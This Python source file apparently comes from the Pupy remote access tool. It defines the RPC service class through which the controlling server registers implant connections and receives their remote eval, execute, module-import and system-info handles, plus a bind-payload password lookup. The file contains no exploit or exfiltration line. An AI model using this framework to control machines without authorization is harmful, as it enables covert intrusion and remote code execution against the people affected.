# -*- coding: utf-8-*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
#
# 1. Redistributions of source code must retain the above copyright
# notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright
# notice, this list of conditions and the following disclaimer in the
# documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its
# contributors may be used to endorse or promote products derived
# from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
# OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED
# AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
# THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
# DAMAGE
# --------------------------------------------------------------

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import sys
import traceback
import json
import zlib
import umsgpack

from pupy.pupylib.PupyCredentials import Credentials

from pupy.network.lib.msgtypes import msgpack_exthook
from pupy.network.lib.rpc import Service, timed, nowait
from pupy.network.lib.convcompat import as_native_string

from . import getLogger
logger = getLogger('service')


class PupyService(Service):
    def __init__(self, *args, **kwargs):
        super(PupyService, self).__init__(*args, **kwargs)
        self._local_cleanups = []
        self._singles = {}

        self.modules = None
        self.namespace = None
        self.builtin = self.builtins = None
        self.register_remote_cleanup = None
        self.unregister_remote_cleanup = None
        self.obtain_call = None
        self.exit = None
        self.eval = None
        self.execute = None
        self.pupyimporter = None
        self.pupyimporter_funcs = None
        self.infos = None
        self.get_infos = None

        self.protocol_version = None
        self.remote_version = (2, 7)

        self.events_receiver = None

        self.remote_loaded_modules = None
        self.remote_cached_modules = None

    def exposed_on_connect(self):
        if sys.version_info.major == 3:
            # Deprecated API
            self._conn.activate_3to2()

        self._conn._config.update({
            'allow_safe_attrs': False,
            'allow_public_attrs': False,
            'allow_pickle': False,
            'allow_getattr': False,
            'allow_setattr': False,
            'allow_delattr': False,
            'allow_all_attrs': False,
            'import_custom_exceptions': False,
            'instantiate_custom_exceptions': False,
            'instantiate_oldstyle_exceptions': False,
        })

        self.modules = None

        self.exposed_stdin = sys.stdin
        self.exposed_stdout = sys.stdout
        self.exposed_stderr = sys.stderr

    def exposed_initialize_v1(
            self,
            namespace, modules, builtin,
            register_cleanup, unregister_cleanup,
            obtain_call,
            remote_exit, remote_eval, remote_execute,
            pupyimporter,
            infos, *args
       ):

        if __debug__:
            logger.debug('Initialize legacy V1 connection.')

        if sys.version_info.major == 3:
            # Deprecated API
            self._conn.activate_3to2()
            # raise NotImplementedError(
            #   'Too old RPC version - python3 to python2 is not supported'
            # )

        self.namespace = namespace
        self.modules = modules
        self.builtin = self.builtins = builtin
        self.register_remote_cleanup = nowait(register_cleanup)
        self.unregister_remote_cleanup = nowait(unregister_cleanup)
        self.obtain_call = obtain_call
        self.exit = timed(remote_exit, 1)
        self.eval = remote_eval
        self.execute = remote_execute
        self.pupyimporter = pupyimporter
        self.infos = umsgpack.loads(infos, ext_hook=msgpack_exthook)
        self.get_infos = lambda: self.infos

        self.pupy_srv.add_client(self)

    def exposed_initialize_v2(
        self,
        protocol_version, remote_version,
        namespace, modules, builtin,
        register_cleanup, unregister_cleanup,
        remote_exit, remote_eval, remote_execute,
        infos, loaded_modules, cached_modules,
            pupyimporter, pupyimporter_funcs, *args):

        if __debug__:
            logger.debug(
                'Initialize V2 connection. Remote proto: %s Python: %s',
                protocol_version, remote_version
            )

        self.protocol_version = protocol_version
        self.remote_version = remote_version

        if sys.version_info.major == 3 and \
                self.remote_version[0] == 2:

            if __debug__:
                logger.debug(
                    'Enable python3 to python2 communication hacks'
                )

            self._conn.activate_3to2()

        self.namespace = namespace
        self.modules = modules
        self.builtin = self.builtins = builtin
        self.register_remote_cleanup = nowait(register_cleanup)
        self.unregister_remote_cleanup = nowait(unregister_cleanup)
        self.obtain_call = False
        self.exit = timed(remote_exit, 1)
        self.eval = remote_eval
        self.execute = remote_execute
        self.pupyimporter = pupyimporter
        self.pupyimporter_funcs = {
            as_native_string(func): ref
            for func, ref in pupyimporter_funcs.items()
        }
        self.infos = infos
        self.get_infos = lambda: self.infos

        self.remote_loaded_modules = set(
            as_native_string(module) for module in loaded_modules
        )

        self.remote_cached_modules = set(
            as_native_string(module) for module in cached_modules
        )

        self.pupy_srv.add_client(self)

    def register_local_cleanup(self, cleanup):
        self._local_cleanups.append(cleanup)

    def unregister_local_cleanup(self, cleanup):
        self._local_cleanups.remove(cleanup)

    def single(self, ctype, *args, **kwargs):
        single = self._singles.get(ctype)
        if not single:
            single = ctype(*args, **kwargs)
            self._singles[ctype] = single

        return single

    def on_disconnect(self):
        self.pupy_srv.remove_client(self)
        for cleanup in self._local_cleanups:
            try:
                cleanup()
            except Exception as e:
                logger.exception(e)

    # Compatibility call
    def exposed_set_modules(self, modules):
        if __debug__:
            logger.debug('Initialize legacy V0 connection.')

        try:
            self.modules = modules
            self.builtin = modules.__builtin__
            self.builtins = self.builtin

            try:
                self.namespace = self._conn.root.namespace
            except Exception as e:
                logger.exception(e)

            self.execute = self._conn.root.execute
            try:
                self.register_remote_cleanup = \
                    self._conn.root.register_cleanup
            except Exception:
                self.register_remote_cleanup = None

            if self.register_remote_cleanup:
                try:
                    self.unregister_remote_cleanup = \
                        self._conn.root.unregister_cleanup
                except Exception:
                    self.unregister_remote_cleanup = None

                try:
                    self.obtain_call = self._conn.root.obtain_call
                except Exception:
                    pass

            self.exit = self._conn.root.exit
            self.eval = self._conn.root.eval
            self.get_infos = self._conn.root.get_infos

            self.pupy_srv.add_client(self)

        except Exception:
            logger.error(traceback.format_exc())
            try:
                self._conn.close()
            except Exception:
                pass

    def exposed_msgpack_dumps(self, js, compressed=False):
        data = umsgpack.dumps(js)
        if compressed:
            data = zlib.compress(data)

        return data

    def exposed_json_dumps(self, js, compressed=False):
        data = json.dumps(js)
        if compressed:
            data = zlib.compress(data)

        return data

    def exposed_broadcast_event(self, eventid, *args, **kwargs):
        logger.info('Event received: %08x', eventid)
        if self.events_receiver:
            self.events_receiver(eventid)
            logger.info('Event handled: %08x', eventid)


class PupyBindService(PupyService):
    def exposed_get_password(self):
        credentials = Credentials()
        return credentials['BIND_PAYLOADS_PASSWORD']
